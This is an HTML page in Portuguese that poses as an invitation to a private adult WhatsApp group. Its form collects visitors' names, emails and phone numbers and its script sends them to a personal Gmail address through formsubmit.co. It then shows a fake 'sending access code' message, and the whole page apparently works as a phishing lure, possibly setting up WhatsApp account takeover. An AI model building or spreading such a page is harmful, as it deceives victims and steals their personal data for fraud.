<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <title>Conteúdo VIP +18</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #000;
      color: #fff;
      text-align: center;
    }
    .container {
      padding: 20px;
      max-width: 400px;
      margin: auto;
    }
    img {
      max-width: 100%;
      border-radius: 10px;
      margin-bottom: 20px;
    }
    input, button {
      width: 90%;
      padding: 14px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
      font-size: 18px;
    }
    input {
      background-color: #222;
      color: #fff;
    }
    button {
      background-color: #e91e63;
      color: #fff;
      cursor: pointer;
    }
    h1 {
      font-size: 26px;
    }
    p {
      font-size: 18px;
    }
    .hidden {
      display: none;
    }
  </style>
</head>
<body>

  <div class="container" id="form-container">
    <h1>Grupo VIP +18</h1>
    <p>Entre agora no nosso grupo privado de conteúdo adulto no WhatsApp.</p>
    <img src="https://i.imgur.com/1gI1n5H.jpg" alt="Modelo">

    <form id="vip-form">
      <input type="text" name="nome" placeholder="Seu nome" required>
      <input type="email" name="email" placeholder="Seu e-mail" required>
      <input type="tel" name="whatsapp" placeholder="Seu WhatsApp com DDD" required>
      <button type="submit">Quero entrar no grupo</button>
    </form>
  </div>

  <div class="container hidden" id="confirmacao">
    <h1>Enviando código...</h1>
    <p>Estamos enviando o código de acesso para o número informado via WhatsApp.</p>
    <p>Aguarde alguns instantes...</p>
  </div>

  <script>
    const form = document.getElementById("vip-form");
    form.addEventListener("submit", function(e) {
      e.preventDefault();
      const dados = new FormData(form);
      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
        method: "POST",
        headers: { 'Accept': 'application/json' },
        body: dados
      }).then(response => {
        document.getElementById("form-container").classList.add("hidden");
        document.getElementById("confirmacao").classList.remove("hidden");
      }).catch(error => {
        alert("Erro ao enviar. Tente novamente.");
      });
    });
  </script>

</body>
</html>
